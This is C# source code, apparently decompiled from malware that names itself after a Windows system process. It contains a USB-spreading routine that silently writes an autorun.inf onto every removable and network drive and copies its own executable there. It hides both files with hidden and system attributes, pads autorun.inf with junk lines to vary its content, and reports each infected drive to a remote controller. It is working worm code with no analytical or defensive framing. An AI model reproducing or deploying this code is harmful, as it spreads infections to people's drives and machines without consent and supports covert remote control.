using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace MI_CSRSS;

internal class USB
{
	public static void Polymorphic_usb_load(string name)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if ((driveInfo.DriveType != DriveType.Removable && driveInfo.DriveType != DriveType.Network) || File.Exists(driveInfo.Name + name + ".exe"))
				{
					continue;
				}
				Process process = new Process();
				process.EnableRaisingEvents = false;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.FileName = "cmd";
				process.StartInfo.Arguments = string.Concat("/c echo ;", RandomNumberGenerator.Create(), Environment.WorkingSet.ToString(), " >> ", driveInfo.Name, "autorun.inf");
				process.Start();
				while (!process.HasExited)
				{
				}
				Process process2 = new Process();
				process2.EnableRaisingEvents = false;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.StartInfo.FileName = "cmd";
				process2.StartInfo.Arguments = "/c echo [autorun] >> " + driveInfo.Name + "autorun.inf";
				process2.Start();
				while (!process2.HasExited)
				{
				}
				Process process3 = new Process();
				process3.EnableRaisingEvents = false;
				process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process3.StartInfo.FileName = "cmd";
				process3.StartInfo.Arguments = string.Concat("/c echo ;", RandomNumberGenerator.Create(), Environment.WorkingSet.ToString(), " >> ", driveInfo.Name, "autorun.inf");
				process3.Start();
				while (!process3.HasExited)
				{
				}
				Process process4 = new Process();
				process4.EnableRaisingEvents = false;
				process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process4.StartInfo.FileName = "cmd";
				process4.StartInfo.Arguments = string.Concat("/c echo ;", RandomNumberGenerator.Create(), Environment.WorkingSet.ToString(), " >> ", driveInfo.Name, "autorun.inf");
				process4.Start();
				while (!process4.HasExited)
				{
				}
				Process process5 = new Process();
				process5.EnableRaisingEvents = false;
				process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process5.StartInfo.FileName = "cmd";
				process5.StartInfo.Arguments = "/c echo open=" + name + ".exe >> " + driveInfo.Name + "autorun.inf";
				process5.Start();
				while (!process5.HasExited)
				{
				}
				Process process6 = new Process();
				process6.EnableRaisingEvents = false;
				process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process6.StartInfo.FileName = "cmd";
				process6.StartInfo.Arguments = string.Concat("/c echo ;", RandomNumberGenerator.Create(), Environment.WorkingSet.ToString(), " >> ", driveInfo.Name, "autorun.inf");
				process6.Start();
				while (!process6.HasExited)
				{
				}
				File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden | FileAttributes.System);
				_ = Process.GetCurrentProcess().MainModule!.FileName;
				try
				{
					Process process7 = new Process();
					process7.EnableRaisingEvents = false;
					process7.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process7.StartInfo.FileName = "cmd";
					process7.StartInfo.Arguments = "/c copy \"" + Application.get_ExecutablePath() + "\" \"" + driveInfo.Name + name + ".exe\"";
					process7.Start();
					while (!process7.HasExited)
					{
					}
					File.SetAttributes(driveInfo.Name + name + ".exe", File.GetAttributes(driveInfo.Name + name + ".exe") | FileAttributes.Hidden | FileAttributes.System);
				}
				catch
				{
				}
				if (File.Exists(driveInfo.Name + name + ".exe") && File.Exists(driveInfo.Name + "autorun.inf"))
				{
					Connection.SendConnByte("USB~" + driveInfo.Name);
				}
			}
		}
		catch
		{
		}
	}
}
